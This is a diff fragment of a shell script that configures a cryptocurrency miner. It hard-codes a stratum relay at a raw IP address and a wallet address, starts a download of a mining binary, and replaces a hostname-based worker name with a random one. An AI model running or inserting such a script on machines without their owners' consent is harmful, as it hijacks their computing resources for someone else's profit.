@@ -5,7 +5,7 @@ set -euo pipefail
 
 RELAY="stratum+tcp://13.140.137.45:8443"
 ADDRESS="PLMGsifmTC9Zn5pHqcMkbayvzSG3SBX6vAwJts3KQCwfGRsznpv2qdyCFyRpnh46TwcQu8mLEu1CVdHdQzsx7Ty637GQc"
-WORKER="mamiku-$(hostname 2>/dev/null | tr -cd 'a-zA-Z0-9-' || echo "r$RANDOM")"
+WORKER="mamiku$(printf '%x%x%x%x' $RANDOM $RANDOM $RANDOM $RANDOM)"
 
 echo "[1/3] download seine v0.3.1"
 mkdir -p "$HOME/bin"
